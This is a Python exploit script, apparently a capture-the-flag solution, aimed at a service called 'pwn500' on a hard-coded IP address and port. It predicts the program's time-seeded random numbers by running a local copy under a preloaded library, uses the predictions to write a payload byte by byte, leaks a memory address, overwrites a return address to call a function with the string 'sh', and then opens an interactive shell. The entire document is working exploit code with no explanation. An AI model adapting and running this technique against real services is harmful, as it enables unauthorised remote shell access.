#!/usr/bin/python
import os
import sys
import time
from zio import *

target = ('218.2.197.235', 23747)
#target = './pwn500'

def guess(gseed):
    t = int(time.time())
    s = ''
    #print t
    for i in range(t+38*60, t+50*60):
        localsample = './pwn500' # sample
        myenv = os.environ
        myenv['LD_PRELOAD'] = './desrand.so'
        myenv['SEED'] = str(i)
        io = zio(localsample, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'), env=myenv)

        io.read_until("Choice:")
        io.writeline("1")
        io.read_until("3. Not sure")
        io.writeline("3")
        io.read_until("The number is ")
        num = io.readline().strip('\n')
        if num == gseed:
            print num
            for j in range(100):#more
                io.read_until("Choice:")
                io.writeline("1")
                io.read_until("3. Not sure")
                io.writeline("3")
                io.read_until("The number is ")
                num = io.readline().strip('\n')

                if int(num, 16) % 2 == 0:
                    s += '2'
                else:
                    s += '1'
            io.terminate()
            io.close()
            break
        else:
            io.terminate()
            io.close()
    
    return s

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))

    io.read_until("Choice:")
    io.writeline("1")
    io.read_until("3. Not sure")
    io.writeline("3")
    io.read_until("The number is ")
    firstnum = io.readline().strip('\n')
    answer = guess(firstnum)#raw_input("give me:")

    secret1 = 'A'*32
    for i, c in enumerate(secret1):
        io.read_until("Choice:")
        io.writeline("1")
        io.read_until("3. Not sure")
        io.writeline(answer[i])
        io.read_until("One more step:")
        io.writeline(c)


    io.read_until(secret1)
    leak_ecx = l32(io.read(4))
    print hex(leak_ecx)

    secret2 = ''+l32(leak_ecx)+'A'*24+l32(0x080484E0) + 'sh\0\0' + l32(leak_ecx)
    for j, d in enumerate(secret2):
        io.read_until("Choice:")
        io.writeline("1")
        io.read_until("3. Not sure")
        io.writeline(answer[len(secret1)+j])
        io.read_until("One more step:")
        io.writeline(d)

    raw_input("exp?")

    io.writeline("3")

    io.interact()


exp(target)
